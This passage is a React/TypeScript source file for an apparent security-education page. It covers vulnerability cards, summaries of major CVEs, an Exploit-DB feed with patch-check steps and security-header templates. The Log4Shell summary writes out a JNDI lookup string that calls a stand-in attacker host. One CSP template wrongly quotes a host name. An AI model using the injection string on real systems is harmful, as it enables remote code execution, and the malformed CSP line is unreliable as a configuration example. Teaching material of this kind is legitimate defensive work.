import { useState, useMemo } from "react";
import { 
  Shield, 
  ChevronDown, 
  ChevronUp, 
  ExternalLink, 
  AlertTriangle, 
  Zap, 
  Lock, 
  Code, 
  Globe, 
  Server, 
  Database, 
  Search, 
  X, 
  Filter, 
  Copy, 
  Check, 
  BookOpen, 
  Terminal, 
  Cpu, 
  CheckCircle2, 
  Info
} from "lucide-react";
import Lottie from "lottie-react";
import "../../styles/learn.css";
import api from "../../api/axios";
import sqlIcon from "../../assets/icons/sql.json";
import sslIcon from "../../assets/icons/ssl.json";
import infoIcon from "../../assets/icons/info.json";
import nampIcon from "../../assets/icons/nmap.json";
import niktoIcon from "../../assets/icons/nikto.json";
import { VULNERABILITIES, type Vulnerability } from "./learnData";

const CVE_DATA = [
  {
    id: "CVE-2021-44228",
    name: "Log4Shell",
    category: "Remote Code Execution",
    severity: "Critical",
    score: "10.0",
    affected: "Apache Log4j 2.0-beta9 to 2.14.1",
    year: "2021",
    icon: "server",
    simple: "Log4j is a popular Java logging library. This bug allowed an attacker to type a special string (like `${jndi:ldap://evil.com/x}`) anywhere that gets logged — in usernames, search fields, HTTP headers — and the server would automatically download and run code from the attacker's computer. No login needed.",
    impact: "Full remote code execution. An attacker could take complete control of any vulnerable server. Affected millions of services including iCloud, Steam, Minecraft, and countless enterprise systems.",
    fix: "Upgrade to Log4j 2.15.0 or later. Disable JNDI lookups by setting `log4j2.formatMsgNoLookups=true`.",
    refs: "https://nvd.nist.gov/vuln/detail/CVE-2021-44228"
  },
  {
    id: "CVE-2017-0144",
    name: "EternalBlue / WannaCry",
    category: "Remote Code Execution",
    severity: "Critical",
    score: "9.8",
    affected: "Windows SMBv1 (XP, 7, Server 2003-2008)",
    year: "2017",
    icon: "globe",
    simple: "Windows computers share files over a protocol called SMB. There was a bug in the old version (SMBv1) where a malformed network packet could crash the system and let an attacker run their own code — without any login or user interaction. This was leaked from the NSA and used in the WannaCry ransomware attack.",
    impact: "Used by WannaCry ransomware which encrypted 230,000+ computers across 150 countries in 2017. Caused billions of dollars in damage including UK's NHS hospitals.",
    fix: "Apply Microsoft security patch MS17-010. Disable SMBv1 on all Windows systems.",
    refs: "https://nvd.nist.gov/vuln/detail/CVE-2017-0144"
  },
  {
    id: "CVE-2014-0160",
    name: "Heartbleed",
    category: "Information Disclosure",
    severity: "High",
    score: "7.5",
    affected: "OpenSSL 1.0.1 through 1.0.1f",
    year: "2014",
    icon: "lock",
    simple: "OpenSSL protects HTTPS websites. It has a 'heartbeat' feature to check if a connection is still alive. You send a message with a length — but there was no check that the actual message matched the claimed length. So attackers could say 'send me back 64KB' while only sending 1 byte, and the server would leak 64KB of its RAM — possibly containing passwords, session tokens, and private encryption keys.",
    impact: "Exposed private SSL keys, user credentials, and session cookies from millions of HTTPS servers worldwide. Affected Yahoo!, LastPass, Cloudflare, and many banks.",
    fix: "Upgrade to OpenSSL 1.0.1g or 1.0.2. Reissue all SSL certificates and force users to change passwords.",
    refs: "https://nvd.nist.gov/vuln/detail/CVE-2014-0160"
  },
  {
    id: "CVE-2014-6271",
    name: "Shellshock",
    category: "Remote Code Execution",
    severity: "Critical",
    score: "9.8",
    affected: "Bash \u2264 4.3 on Linux/Unix/macOS web servers",
    year: "2014",
    icon: "server",
    simple: "Bash is the command-line shell on most Linux servers. CGI web applications set HTTP request headers as environment variables before calling Bash. Shellshock let attackers embed executable code directly inside an HTTP header value — and Bash would blindly run it when parsing the environment variable.",
    impact: "Immediate RCE on any CGI-based web server running Bash. Attackers could create botnets, steal data, or install backdoors within seconds of exploitation.",
    fix: "Update Bash to 4.3 patch 25 or later. Disable CGI scripts where possible or migrate to modern application servers.",
    refs: "https://nvd.nist.gov/vuln/detail/CVE-2014-6271"
  },
  {
    id: "CVE-2020-10148",
    name: "SolarWinds Orion Auth Bypass",
    category: "Authentication Bypass",
    severity: "Critical",
    score: "9.8",
    affected: "SolarWinds Orion Platform 2019.4 HF5 \u2013 2020.2.1",
    year: "2020",
    icon: "lock",
    simple: "The SolarWinds Orion IT monitoring platform had a flaw where an attacker could append specific request parameters to API calls and completely skip the authentication layer, getting admin access to the monitoring dashboard without any credentials.",
    impact: "Leveraged in the massive SolarWinds supply chain attack affecting 18,000+ organizations including US government agencies. Attackers had months of undetected access.",
    fix: "Apply SolarWinds hotfix 2020.2.1 HF2. Enforce network segmentation to isolate Orion servers from the internet.",
    refs: "https://nvd.nist.gov/vuln/detail/CVE-2020-10148"
  },
  {
    id: "CVE-2021-26855",
    name: "ProxyLogon (MS Exchange SSRF)",
    category: "Server-Side Request Forgery",
    severity: "Critical",
    score: "9.8",
    affected: "Microsoft Exchange Server 2013-2019",
    year: "2021",
    icon: "globe",
    simple: "Microsoft Exchange had an SSRF vulnerability that let attackers send requests to the Exchange back-end as if they were the server itself. Combined with a second bug allowing file writes, attackers could plant a web shell and execute arbitrary commands — all without credentials.",
    impact: "Exploited by nation-state actors to backdoor 250,000+ Exchange servers worldwide within days of disclosure. Used for espionage and ransomware deployment.",
    fix: "Apply Microsoft cumulative updates (CUs) for Exchange. Run the EOMT (Exchange On-premises Mitigation Tool) immediately.",
    refs: "https://nvd.nist.gov/vuln/detail/CVE-2021-26855"
  },
  {
    id: "CVE-2022-30190",
    name: "Follina (MSDT RCE)",
    category: "Remote Code Execution",
    severity: "High",
    score: "7.8",
    affected: "Microsoft Office 2013-2021, Windows 7-11",
    year: "2022",
    icon: "code",
    simple: "Office documents can embed URLs that trigger the Microsoft Support Diagnostic Tool (MSDT). Follina abused this to execute PowerShell commands just by opening or previewing a malicious Word document — no macros needed and no prompt shown to the victim.",
    impact: "Zero-click exploitation via email phishing. Used by threat actors to install infostealers and ransomware against government and enterprise targets worldwide.",
    fix: "Apply Microsoft patch KB5014697. Disable the MSDT URL protocol via registry as a workaround pending full patch deployment.",
    refs: "https://nvd.nist.gov/vuln/detail/CVE-2022-30190"
  },
  {
    id: "CVE-2023-23397",
    name: "Outlook Zero-Click NTLM Theft",
    category: "Credential Theft",
    severity: "Critical",
    score: "9.8",
    affected: "Microsoft Outlook for Windows (all versions before March 2023 patch)",
    year: "2023",
    icon: "lock",
    simple: "Outlook automatically processes meeting invitations including a custom sound reminder path. By setting that path to a UNC path on an attacker-controlled server, Outlook would connect to it automatically — even before the email was opened — leaking the user's NTLM password hash which could be cracked or relayed.",
    impact: "Zero user interaction required. Russian APT28 used this to steal credentials from European defense and government organizations for over a year before disclosure.",
    fix: "Apply Microsoft March 2023 Patch Tuesday update. Add users to the Protected Users Security Group to prevent NTLM authentication.",
    refs: "https://nvd.nist.gov/vuln/detail/CVE-2023-23397"
  }
];

// Security Header profiles
const HEADER_PROFILES: Record<string, string> = {
  express: `// Express helmet configuration
const helmet = require('helmet');
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'trusted-cdn.com'"],
      objectSrc: ["'none'"],
      upgradeInsecureRequests: [],
    },
  },
  crossOriginEmbedderPolicy: true,
  xFrameOptions: { action: "deny" }
}));`,
  nginx: `# Nginx config file HTTP/server block
add_header Content-Security-Policy "default-src 'self'; script-src 'self'; object-src 'none'; frame-ancestors 'none';" always;
add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;
add_header X-Frame-Options "DENY" always;
add_header X-Content-Type-Options "nosniff" always;
add_header Referrer-Policy "no-referrer-when-downgrade" always;
add_header Permissions-Policy "geolocation=(), camera=(), microphone=()" always;`,
  apache: `# Apache .htaccess configuration
Header set Content-Security-Policy "default-src 'self';"
Header set Strict-Transport-Security "max-age=63072000; includeSubDomains; preload"
Header set X-Frame-Options "DENY"
Header set X-Content-Type-Options "nosniff"
Header set Referrer-Policy "no-referrer-when-downgrade"
Header set Permissions-Policy "geolocation=(), camera=()"`,
  nextjs: `// next.config.js secure headers
const securityHeaders = [
  { key: 'X-DNS-Prefetch-Control', value: 'on' },
  { key: 'X-Frame-Options', value: 'DENY' },
  { key: 'Content-Security-Policy', value: "default-src 'self';" }
];
module.exports = {
  async headers() {
    return [{ source: '/(.*)', headers: securityHeaders }];
  }
};`,
  springboot: `// Spring Security Config definition
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http.headers(headers -> headers
        .contentSecurityPolicy(csp -> csp.policyDirectives("default-src 'self'"))
        .frameOptions(frame -> frame.deny())
        .httpStrictTransportSecurity(hsts -> hsts.includeSubDomains(true).maxAgeInSeconds(31536000))
    );
    return http.build();
}`
};

export default function Learn() {
  type ExploitItem = {
    title?: string;
    pubDate?: string;
    cves?: string[];
    description?: string;
    link?: string;
  };

  // State elements
  const [activeTab, setActiveTab] = useState<"vulns" | "cve" | "exploitdb" | "tools">("vulns");
  const [searchTerm, setSearchTerm] = useState("");
  const [selectedCategory, setSelectedCategory] = useState("");
  const [selectedSeverity, setSelectedSeverity] = useState("");
  const [selectedLanguage, setSelectedLanguage] = useState("");
  const [selectedFramework, setSelectedFramework] = useState("");
  const [selectedDifficulty, setSelectedDifficulty] = useState("");
  
  // Selected vulnerability for detailed Modal view
  const [selectedVulnModal, setSelectedVulnModal] = useState<Vulnerability | null>(null);
  const [activeCodeLang, setActiveCodeLang] = useState<string>("javascript");
  const [copiedCodeId, setCopiedCodeId] = useState<string | null>(null);

  // AI Prompt Generator
  const [aiVuln, setAiVuln] = useState("sqli");
  const [aiLang, setAiLang] = useState("javascript");
  const [aiFramework, setAiFramework] = useState("express");
  const [copiedPrompt, setCopiedPrompt] = useState(false);

  // Security Header Generator
  const [headerTech, setHeaderTech] = useState("express");
  const [copiedHeader, setCopiedHeader] = useState(false);

  // Original states preserved
  const [openCve, setOpenCve] = useState<string | null>(null);
  const [exploits, setExploits] = useState<ExploitItem[]>([]);
  const [loadingExploits, setLoadingExploits] = useState(false);
  const [exploitError, setExploitError] = useState<string | null>(null);

  // Animation assets mapping
  const lottieIconMap: Record<string, object> = {
    sql: sqlIcon,
    ssl: sslIcon,
    info: infoIcon,
    nmap: nampIcon,
    nikto: niktoIcon,
  };

  const getIcon = (name: string, size = 20) => {
    if (lottieIconMap[name]) {
      return (
        <div style={{ width: size, height: size, minWidth: size, minHeight: size }}>
          <Lottie 
            animationData={lottieIconMap[name]} 
            loop 
            autoplay 
            style={{ width: '100%', height: '100%' }}
          />
        </div>
      );
    }
    
    switch (name) {
      case "server": return <Server size={size} />;
      case "globe": return <Globe size={size} />;
      case "lock": return <Lock size={size} />;
      case "code": return <Code size={size} />;
      case "zap": return <Zap size={size} />;
      case "alert": return <AlertTriangle size={size} />;
      default: return <Shield size={size} />;
    }
  };

  // Safe manual steps
  const getManualCheckSteps = (exploit: ExploitItem) => {
    const title = String(exploit?.title || "").toLowerCase();
    const steps = [
      "Identify the exact product and version mentioned in the advisory.",
      "Compare your server/app version with the affected range.",
      "Review vendor guidance and apply the recommended patch or config change.",
      "Re-check headers, version banners, or public metadata to confirm the fix.",
    ];

    if (title.includes("wordpress") || title.includes("plugin")) {
      steps.unshift("Check your WordPress core and plugin versions in wp-admin > Updates.");
    }
    if (title.includes("apache") || title.includes("nginx")) {
      steps.unshift("Confirm your web server version via server headers or package manager.");
    }
    if (title.includes("sql")) {
      steps.unshift("Review database queries for unsafe string concatenation.");
    }

    return steps.slice(0, 5);
  };

  // Load ExploitDB
  const loadExploits = async () => {
    if (loadingExploits || exploits.length > 0 || exploitError) return;
    setLoadingExploits(true);
    try {
      const res = await api.get("/api/exploit/latest");
      if (res.data && res.data.success) {
        setExploits(Array.isArray(res.data.exploits) ? res.data.exploits : []);
      } else {
        setExploitError("Failed to load exploits.");
      }
    } catch (err: unknown) {
      const message =
        typeof err === "object" && err && "response" in err
          ? (err as { response?: { data?: { error?: string } } }).response?.data?.error
          : undefined;
      setExploitError(message || "Error connecting to Exploit-DB feed.");
    } finally {
      setLoadingExploits(false);
    }
  };

  // Filtering Logic
  const filteredVulns = useMemo(() => {
    return VULNERABILITIES.filter((v) => {
      // Search matches
      const query = searchTerm.toLowerCase();
      const matchesSearch = 
        v.name.toLowerCase().includes(query) ||
        v.category.toLowerCase().includes(query) ||
        v.owasp.toLowerCase().includes(query) ||
        v.description.toLowerCase().includes(query) ||
        v.affectedTechnologies.some(t => t.toLowerCase().includes(query)) ||
        v.tags.some(t => t.toLowerCase().includes(query));

      const matchesCategory = selectedCategory ? v.category === selectedCategory : true;
      const matchesSeverity = selectedSeverity ? v.severity === selectedSeverity : true;
      const matchesDifficulty = selectedDifficulty ? v.difficulty === selectedDifficulty : true;
      
      const matchesLanguage = selectedLanguage 
        ? Object.keys(v.languages).map(l => l.toLowerCase()).includes(selectedLanguage.toLowerCase()) 
        : true;
      
      const matchesFramework = selectedFramework 
        ? Object.keys(v.frameworks).map(f => f.toLowerCase()).includes(selectedFramework.toLowerCase()) 
        : true;

      return matchesSearch && matchesCategory && matchesSeverity && matchesLanguage && matchesFramework && matchesDifficulty;
    });
  }, [searchTerm, selectedCategory, selectedSeverity, selectedLanguage, selectedFramework, selectedDifficulty]);

  // Categories list extraction
  const categories = useMemo(() => {
    return Array.from(new Set(VULNERABILITIES.map((v) => v.category)));
  }, []);

  // Copy code helper
  const handleCopyCode = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedCodeId(id);
    setTimeout(() => setCopiedCodeId(null), 2000);
  };

  // AI Prompt formulation
  const generatedAiPrompt = useMemo(() => {
    const selectedV = VULNERABILITIES.find(v => v.id === aiVuln);
    if (!selectedV) return "Please select options to generate prompt.";

    return `Remediate the following security vulnerability:
Vulnerability: ${selectedV.name} (${selectedV.owasp})
Severity: ${selectedV.severity}
Implementation Environment: Language: ${aiLang}, Framework/Platform: ${aiFramework}

Please review the following code template, explain the vulnerability present, and provide a secure, drop-in replacement that implements industry-standard input validation, proper context encoding, and secure parameters. Keep performance and edge cases in mind.

${selectedV.languages[aiLang]?.vuln || `// Sample ${aiLang} code for ${selectedV.name}`}
`;
  }, [aiVuln, aiLang, aiFramework]);

  const handleCopyPrompt = () => {
    navigator.clipboard.writeText(generatedAiPrompt);
    setCopiedPrompt(true);
    setTimeout(() => setCopiedPrompt(false), 2000);
  };

  const handleCopyHeader = () => {
    navigator.clipboard.writeText(HEADER_PROFILES[headerTech]);
    setCopiedHeader(true);
    setTimeout(() => setCopiedHeader(false), 2000);
  };

  // Reset all filters
  const handleResetFilters = () => {
    setSearchTerm("");
    setSelectedCategory("");
    setSelectedSeverity("");
    setSelectedLanguage("");
    setSelectedFramework("");
    setSelectedDifficulty("");
  };

  return (
    <div className="skh-page">
      {/* Hero Header */}
      <div className="skh-hero">
        <div className="skh-hero-badge">
          <BookOpen size={14} />
          <span>AppSec Academy & Lab</span>
        </div>
        <h1>Security Knowledge Hub</h1>
        <p>
          Master secure coding principles with comprehensive mitigation matrices, language-specific code companions, 
          and production-ready configurations mapped directly to OWASP and real-world CVEs.
        </p>
        
        {/* Statistics Bar */}
        <div className="skh-stats-bar">
          <div className="skh-stat">
            <span className="skh-stat-num">25</span>
            <span className="skh-stat-label">Controls Covered</span>
          </div>
          <div className="skh-stat-div"></div>
          <div className="skh-stat">
            <span className="skh-stat-num">8</span>
            <span className="skh-stat-label">Languages Supported</span>
          </div>
          <div className="skh-stat-div"></div>
          <div className="skh-stat">
            <span className="skh-stat-num">8</span>
            <span className="skh-stat-label">Frameworks</span>
          </div>
          <div className="skh-stat-div"></div>
          <div className="skh-stat">
            <span className="skh-stat-num">100%</span>
            <span className="skh-stat-label">OWASP Covered</span>
          </div>
        </div>

        {/* Global Search Bar */}
        <div className="skh-search-wrap">
          <Search className="skh-search-icon" size={20} />
          <input
            type="text"
            className="skh-search"
            placeholder="Search by vulnerability name, programming language, framework, tag..."
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
          />
          {searchTerm && (
            <button className="skh-search-clear" onClick={() => setSearchTerm("")}>
              <X size={16} />
            </button>
          )}
        </div>
      </div>

      {/* Tabs Menu */}
      <div className="skh-tabs">
        <button
          className={`skh-tab ${activeTab === "vulns" ? "active" : ""}`}
          onClick={() => setActiveTab("vulns")}
        >
          <Code size={16} /> 
          <span>Vulnerability Library</span>
          <span className="skh-tab-count">{filteredVulns.length}</span>
        </button>
        <button
          className={`skh-tab ${activeTab === "cve" ? "active" : ""}`}
          onClick={() => setActiveTab("cve")}
        >
          <AlertTriangle size={16} />
          <span>Real-World CVEs</span>
        </button>
        <button
          className={`skh-tab ${activeTab === "exploitdb" ? "active" : ""}`}
          onClick={() => {
            setActiveTab("exploitdb");
            void loadExploits();
          }}
        >
          <Database size={16} />
          <span>ExploitDB Feed</span>
        </button>
        <button
          className={`skh-tab ${activeTab === "tools" ? "active" : ""}`}
          onClick={() => setActiveTab("tools")}
        >
          <Terminal size={16} />
          <span>Remediation Tools</span>
        </button>
      </div>

      {/* Tab Content: Vulnerabilities Library */}
      {activeTab === "vulns" && (
        <>
          {/* Smart Filtering Row */}
          <div className="skh-filters">
            <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
              <Filter size={14} style={{ color: "rgba(224,250,255,0.4)" }} />
              <span className="skh-filter-label">Filters</span>
            </div>
            
            <select
              className="skh-filter-select"
              value={selectedCategory}
              onChange={(e) => setSelectedCategory(e.target.value)}
            >
              <option value="">Category (All)</option>
              {categories.map((c) => (
                <option key={c} value={c}>{c}</option>
              ))}
            </select>

            <select
              className="skh-filter-select"
              value={selectedSeverity}
              onChange={(e) => setSelectedSeverity(e.target.value)}
            >
              <option value="">Severity (All)</option>
              <option value="Critical">Critical</option>
              <option value="High">High</option>
              <option value="Medium">Medium</option>
              <option value="Low">Low</option>
            </select>

            <select
              className="skh-filter-select"
              value={selectedDifficulty}
              onChange={(e) => setSelectedDifficulty(e.target.value)}
            >
              <option value="">Difficulty (All)</option>
              <option value="Beginner">Beginner</option>
              <option value="Intermediate">Intermediate</option>
              <option value="Advanced">Advanced</option>
            </select>

            <select
              className="skh-filter-select"
              value={selectedLanguage}
              onChange={(e) => setSelectedLanguage(e.target.value)}
            >
              <option value="">Language (All)</option>
              <option value="javascript">JavaScript</option>
              <option value="python">Python</option>
              <option value="go">Go</option>
              <option value="rust">Rust</option>
            </select>

            <select
              className="skh-filter-select"
              value={selectedFramework}
              onChange={(e) => setSelectedFramework(e.target.value)}
            >
              <option value="">Framework (All)</option>
              <option value="express">Express</option>
              <option value="django">Django</option>
              <option value="flask">Flask</option>
            </select>

            {(selectedCategory || selectedSeverity || selectedDifficulty || selectedLanguage || selectedFramework || searchTerm) && (
              <button className="skh-filter-clear" onClick={handleResetFilters}>
                Clear Filters
              </button>
            )}
          </div>

          {/* Cards Grid */}
          {filteredVulns.length > 0 ? (
            <div className="skh-cards-grid">
              {filteredVulns.map((v) => (
                <div key={v.id} className="skh-card" onClick={() => {
                  setSelectedVulnModal(v);
                  const firstLang = Object.keys(v.languages)[0] || "javascript";
                  setActiveCodeLang(firstLang);
                }}>
                  <div className={`skh-card-accent ${v.severity === "Critical" ? "bg-red-500" : v.severity === "High" ? "bg-orange-500" : v.severity === "Medium" ? "bg-yellow-500" : "bg-blue-500"}`} 
                    style={{ backgroundColor: v.severity === "Critical" ? "#f87171" : v.severity === "High" ? "#fb923c" : v.severity === "Medium" ? "#fbbf24" : "#38bdf8" }} />
                  <div className="skh-card-body">
                    <div className="skh-card-top">
                      <div>
                        <h3 className="skh-card-title">{v.name}</h3>
                        <span className="skh-card-cat">{v.category}</span>
                      </div>
                      <div className="skh-card-badges">
                        <span className={`skh-sev-badge ${v.severity === "Critical" ? "skh-sev-critical" : v.severity === "High" ? "skh-sev-high" : v.severity === "Medium" ? "skh-sev-medium" : "skh-sev-low"}`}>
                          {v.severity}
                        </span>
                        <span className={`skh-diff-badge ${v.difficulty === "Beginner" ? "skh-diff-beginner" : v.difficulty === "Intermediate" ? "skh-diff-intermediate" : "skh-diff-advanced"}`}>
                          {v.difficulty}
                        </span>
                      </div>
                    </div>
                    
                    <p className="skh-card-desc">{v.description}</p>
                    
                    <div className="skh-card-techs">
                      {v.affectedTechnologies.slice(0, 4).map((tech) => (
                        <span key={tech} className="skh-tech-pill">{tech}</span>
                      ))}
                      {v.affectedTechnologies.length > 4 && (
                        <span className="skh-tech-pill">+{v.affectedTechnologies.length - 4}</span>
                      )}
                    </div>
                    
                    <div className="skh-card-tags">
                      {v.tags.map((tag) => (
                        <span key={tag} className="skh-tag">{tag}</span>
                      ))}
                    </div>
                  </div>
                  <div className="skh-card-footer">
                    <span className="skh-owasp-ref">{v.owasp}</span>
                    <button className="skh-view-btn">
                      <span>Mitigate</span>
                      <ChevronDown size={14} />
                    </button>
                  </div>
                </div>
              ))}
            </div>
          ) : (
            <div className="skh-empty">
              <Shield size={48} />
              <h3>No Vulnerability Matches Found</h3>
              <p>Try refining your search terms or clearing selected configuration filters.</p>
            </div>
          )}
        </>
      )}

      {/* Tab Content: Real-World CVEs */}
      {activeTab === "cve" && (
        <div className="skh-cve-list">

          {/* CVE Intelligence Dashboard Banner */}
          <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(140px, 1fr))", gap: "12px", marginBottom: "24px" }}>
            {[
              { label: "Total CVEs", value: CVE_DATA.length, color: "#00f2ff" },
              { label: "Critical", value: CVE_DATA.filter(c => c.severity === "Critical").length, color: "#ff4d4d" },
              { label: "High", value: CVE_DATA.filter(c => c.severity === "High").length, color: "#fb923c" },
              { label: "RCE Class", value: CVE_DATA.filter(c => c.category === "Remote Code Execution").length, color: "#a855f7" },
            ].map(stat => (
              <div key={stat.label} style={{ padding: "16px", background: "rgba(10,15,25,0.7)", border: `1px solid ${stat.color}22`, borderLeft: `3px solid ${stat.color}`, borderRadius: "8px" }}>
                <div style={{ fontFamily: "'Orbitron', sans-serif", fontSize: "1.6rem", fontWeight: 800, color: stat.color, lineHeight: 1 }}>{stat.value}</div>
                <div style={{ fontSize: "0.72rem", color: "rgba(224,250,255,0.5)", textTransform: "uppercase", letterSpacing: "1px", marginTop: "6px" }}>{stat.label}</div>
              </div>
            ))}
          </div>

          {/* CVE Search */}
          <div style={{ position: "relative", marginBottom: "20px" }}>
            <Search size={16} style={{ position: "absolute", left: 14, top: "50%", transform: "translateY(-50%)", color: "rgba(224,250,255,0.4)", pointerEvents: "none" }} />
            <input
              type="text"
              placeholder="Search CVEs by ID, name, or category..."
              value={searchTerm}
              onChange={e => setSearchTerm(e.target.value)}
              style={{ width: "100%", background: "rgba(10,15,25,0.6)", border: "1px solid rgba(0,242,255,0.15)", borderRadius: "8px", padding: "10px 12px 10px 40px", color: "#e6edf3", fontFamily: "'Rajdhani', sans-serif", fontSize: "0.95rem", outline: "none", boxSizing: "border-box" }}
            />
          </div>

          {CVE_DATA.filter(cve =>
            !searchTerm ||
            cve.id.toLowerCase().includes(searchTerm.toLowerCase()) ||
            cve.name.toLowerCase().includes(searchTerm.toLowerCase()) ||
            cve.category.toLowerCase().includes(searchTerm.toLowerCase())
          ).map((cve) => (
            <div key={cve.id} className="skh-cve-card">
              <div className="skh-cve-header" onClick={() => setOpenCve(openCve === cve.id ? null : cve.id)}>
                <div className="skh-cve-left">
                  <div className="skh-cve-icon-wrap" style={{ color: cve.severity === "Critical" ? "#f87171" : "#fb923c" }}>
                    {getIcon(cve.icon, 20)}
                  </div>
                  <div>
                    <div style={{ display: "flex", gap: 8, alignItems: "center" }}>
                      <span className="skh-cve-id">{cve.id}</span>
                      <span className="skh-cve-name">{cve.name}</span>
                    </div>
                    <span className="skh-cve-cat">{cve.category}</span>
                  </div>
                </div>
                <div className="skh-cve-right">
                  <span className={`skh-sev-badge ${cve.severity === "Critical" ? "skh-sev-critical" : "skh-sev-high"}`}>
                    CVSS {cve.score} • {cve.severity}
                  </span>
                  {openCve === cve.id ? <ChevronUp size={18} /> : <ChevronDown size={18} />}
                </div>
              </div>
              {openCve === cve.id && (
                <div className="skh-cve-body">
                  <div className="skh-cve-affected">
                    <strong>Affected Systems:</strong> {cve.affected}
                  </div>
                  <div className="skh-cve-section">
                    <h4>What happened? (Simple Explanation)</h4>
                    <p>{cve.simple}</p>
                  </div>
                  <div className="skh-cve-two-col">
                    <div className="skh-cve-section">
                      <h4 style={{ color: "#f87171" }}>Real-World Impact</h4>
                      <p>{cve.impact}</p>
                    </div>
                    <div className="skh-cve-section">
                      <h4 style={{ color: "#00ff9d" }}>Remediation Strategy</h4>
                      <p>{cve.fix}</p>
                    </div>
                  </div>
                  <a href={cve.refs} target="_blank" rel="noreferrer" className="skh-ref-link">
                    <ExternalLink size={14} />
                    <span>View Advisory on NVD</span>
                  </a>
                </div>
              )}
            </div>
          ))}
        </div>
      )}

      {/* Tab Content: ExploitDB Feed */}
      {activeTab === "exploitdb" && (
        <div className="skh-cve-list">
          <div className="skh-callout">
            Showing the latest web-focused Exploit-DB entries with safe, manual validation steps.
          </div>
          {loadingExploits && <p style={{ color: "#8b949e", textAlign: "center", padding: "2rem" }}>Loading latest exploits...</p>}
          {exploitError && <p style={{ color: "#f87171", textAlign: "center", padding: "2rem" }}>{exploitError}</p>}
          {!loadingExploits && !exploitError && exploits.map((exploit, idx) => (
            <div key={idx} className="skh-cve-card" style={{ padding: "20px" }}>
              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", marginBottom: "8px", flexWrap: "wrap", gap: 8 }}>
                <h4 style={{ margin: 0, color: "#fff", fontSize: "0.95rem" }}>{exploit.title}</h4>
                <span style={{ color: "rgba(224,250,255,0.4)", fontSize: "0.75rem" }}>
                  {exploit.pubDate ? new Date(exploit.pubDate).toLocaleDateString() : "Unknown date"}
                </span>
              </div>
              {Array.isArray(exploit.cves) && exploit.cves.length > 0 && (
                <div className="skh-exploit-tags">
                  {exploit.cves.map((cve: string) => (
                    <span key={cve} className="skh-exploit-tag">{cve}</span>
                  ))}
                </div>
              )}
              <p style={{ color: "rgba(224,250,255,0.6)", fontSize: "0.85rem", marginTop: 0, marginBottom: "16px" }}>
                {exploit.description}
              </p>
              <div className="skh-cve-section">
                <h4>Manual Check (Safe Verification)</h4>
                <ul className="skh-checklist">
                  {getManualCheckSteps(exploit).map((step) => (
                    <li key={step}>{step}</li>
                  ))}
                </ul>
              </div>
              <div style={{ marginTop: "16px" }}>
                <a href={exploit.link} target="_blank" rel="noreferrer" className="skh-ref-link" style={{ display: "inline-flex", padding: "6px 12px", background: "rgba(56,189,248,0.06)", border: "1px solid rgba(56,189,248,0.2)", borderRadius: "6px" }}>
                  <ExternalLink size={14} />
                  <span>View on Exploit-DB</span>
                </a>
              </div>
            </div>
          ))}
        </div>
      )}

      {/* Tab Content: Remediation Tools */}
      {activeTab === "tools" && (
        <div style={{ display: "flex", flexDirection: "column", gap: 24 }}>
          {/* AI Security Prompt Generator */}
          <div className="skh-ai-generator">
            <h3 style={{ margin: "0 0 8px 0", color: "#fff", fontFamily: "'Orbitron', sans-serif", fontSize: "1rem", display: "flex", alignItems: "center", gap: 8 }}>
              <Cpu size={18} style={{ color: "#00f2ff" }} />
              <span>AI Security Prompt Generator</span>
            </h3>
            <p style={{ color: "rgba(224,250,255,0.5)", fontSize: "0.85rem", margin: "0 0 16px 0" }}>
              Select a vulnerability, programming language, and framework to compile a specialized instruction prompt 
              for AI assistants (like ChatGPT, Claude, Cursor) instructing them to securely patch your code without introducing logic side-effects.
            </p>

            <div className="skh-ai-selects">
              <div style={{ display: "flex", flexDirection: "column", gap: 4 }}>
                <label>Vulnerability</label>
                <select className="skh-filter-select" value={aiVuln} onChange={(e) => setAiVuln(e.target.value)}>
                  {VULNERABILITIES.map(v => (
                    <option key={v.id} value={v.id}>{v.name}</option>
                  ))}
                </select>
              </div>

              <div style={{ display: "flex", flexDirection: "column", gap: 4 }}>
                <label>Language</label>
                <select className="skh-filter-select" value={aiLang} onChange={(e) => setAiLang(e.target.value)}>
                  <option value="javascript">JavaScript</option>
                  <option value="python">Python</option>
                  <option value="go">Go</option>
                  <option value="rust">Rust</option>
                </select>
              </div>

              <div style={{ display: "flex", flexDirection: "column", gap: 4 }}>
                <label>Framework</label>
                <select className="skh-filter-select" value={aiFramework} onChange={(e) => setAiFramework(e.target.value)}>
                  <option value="express">Express</option>
                  <option value="django">Django</option>
                  <option value="flask">Flask</option>
                  <option value="nextjs">Next.js</option>
                </select>
              </div>
            </div>

            <div className="skh-prompt-box">
              {generatedAiPrompt}
            </div>

            <div className="skh-ai-actions">
              <button className="skh-copy-prompt-btn" onClick={handleCopyPrompt}>
                {copiedPrompt ? <CheckCircle2 size={16} style={{ color: "#00ff9d" }} /> : <Copy size={16} />}
                <span>{copiedPrompt ? "Copied to Clipboard!" : "Copy Prompt for AI"}</span>
              </button>
            </div>
          </div>

          {/* Security Headers Profile Generator */}
          <div className="skh-header-gen">
            <h3 style={{ margin: "0 0 8px 0", color: "#c084fc", fontFamily: "'Orbitron', sans-serif", fontSize: "1rem", display: "flex", alignItems: "center", gap: 8 }}>
              <Lock size={18} />
              <span>HTTP Security Headers Configurator</span>
            </h3>
            <p style={{ color: "rgba(224,250,255,0.5)", fontSize: "0.85rem", margin: "0 0 16px 0" }}>
              Quickly generate secure HTTP Headers configurations (CSP, HSTS, XSS Protection, Referrer Policies) 
              optimized for your web server configuration proxy or environment.
            </p>

            <div className="skh-lang-tabs" style={{ marginBottom: 12 }}>
              {["express", "nginx", "apache", "nextjs", "springboot"].map(tech => (
                <button
                  key={tech}
                  className={`skh-lang-btn ${headerTech === tech ? "active" : ""}`}
                  onClick={() => setHeaderTech(tech)}
                >
                  {tech.toUpperCase()}
                </button>
              ))}
            </div>

            <pre className="skh-header-output">{HEADER_PROFILES[headerTech]}</pre>

            <div style={{ marginTop: 12 }}>
              <button className="skh-copy-prompt-btn" style={{ borderColor: "rgba(168,85,247,0.3)", color: "#c084fc" }} onClick={handleCopyHeader}>
